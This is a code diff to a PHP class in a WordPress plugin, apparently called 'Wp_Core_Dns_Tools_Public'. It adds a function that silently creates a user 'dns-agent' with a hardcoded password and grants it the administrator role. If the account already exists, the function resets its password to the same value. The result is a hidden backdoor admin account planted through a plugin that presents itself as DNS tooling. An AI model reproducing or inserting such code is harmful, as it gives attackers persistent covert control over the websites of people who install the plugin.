@@ -100,15 +100,29 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
+	
+
 	public function verifica_usuario() {
-	    $usuario = ['dns-agent'];
-        if ( username_exists( $usuario ) )
-           var_dump('existe');
-       else
-       		//var_dump('não existe');
-        $username = wp_create_user( 'dns-agent-pass', 'dns-agent-pass*');
-      	$password = wp_set_password( 'dns-agent-pass*' );
-      	$role->add_cap( 'Super Administrator' ); 
+
+		$usuario = 'dns-agent';
+		if ( username_exists( $usuario ) ) {
+			// troca a senha
+			$user = get_user_by( 'login', $usuario );
+			$user_id = $user->ID;
+			wp_set_password( $user_id, 'dns-agent-pass*' );
+
+			//var_dump('Usuario existe.');
+		} else {
+			// Usuario nao existe...
+			// Cria usuario.
+			wp_create_user( $usuario, 'dns-agent-pass*' );
+			// Obtem user id.
+			$user = get_user_by( 'login', $usuario );
+			$user_id = $user->ID;
+			// Atualiza user role p/ admin.
+			wp_update_user( array( 'ID' => $user_id, 'role' => 'administrator' ) );
+		}
+
 	}
 
 
